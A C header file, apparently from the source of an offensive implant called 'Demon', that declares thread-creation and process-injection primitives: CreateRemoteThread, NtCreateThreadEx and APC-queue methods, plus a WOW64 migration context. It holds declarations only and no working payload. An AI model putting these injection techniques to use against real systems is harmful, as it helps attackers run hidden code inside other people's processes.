#ifndef DEMON_THREAD_H
#define DEMON_THREAD_H

#include <Common/Native.h>
#include <Core/Win32.h>

/* thread execution methods */
#define THREAD_METHOD_DEFAULT            0
#define THREAD_METHOD_CREATEREMOTETHREAD 1
#define THREAD_METHOD_NTCREATEHREADEX    2
#define THREAD_METHOD_NTQUEUEAPCTHREAD   3

#if _M_IX86

// Definitions used for running native x64 code from a wow64 process (see executex64.asm)
typedef BOOL (WINAPI * X64FUNCTION)( DWORD dwParameter );
typedef DWORD (WINAPI * EXECUTEX64)( X64FUNCTION pFunction, DWORD dwParameter );


ULONG_PTR ExecuteX64( PVOID Function, PVOID Context );

ULONG_PTR RemoteThreadX64( VOID );

// The context used for injection via migrate_via_remotethread_wow64
typedef struct _WOW64CONTEXT
{
    union
    {
        HANDLE hProcess;
        BYTE bPadding2[8];
    } h;

    union
    {
        LPVOID lpStartAddress;
        BYTE bPadding1[8];
    } s;

    union
    {
        LPVOID lpParameter;
        BYTE bPadding2[8];
    } p;
    union
    {
        HANDLE hThread;
        BYTE bPadding2[8];
    } t;
} WOW64CONTEXT, * LPWOW64CONTEXT;

#endif

BOOL ThreadQueryTib(
    IN  PVOID   Adr,
    OUT PNT_TIB Tib
);

HANDLE ThreadCreateWoW64(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  PVOID  Entry,
    IN  PVOID  Arg
);

HANDLE ThreadCreate(
    IN  BYTE   Method,
    IN  HANDLE Process,
    IN  BOOL   x64,
    IN  PVOID  Entry,
    IN  PVOID  Arg,
    OUT PDWORD ThreadId
);

#endif //DEMON_THREAD_H
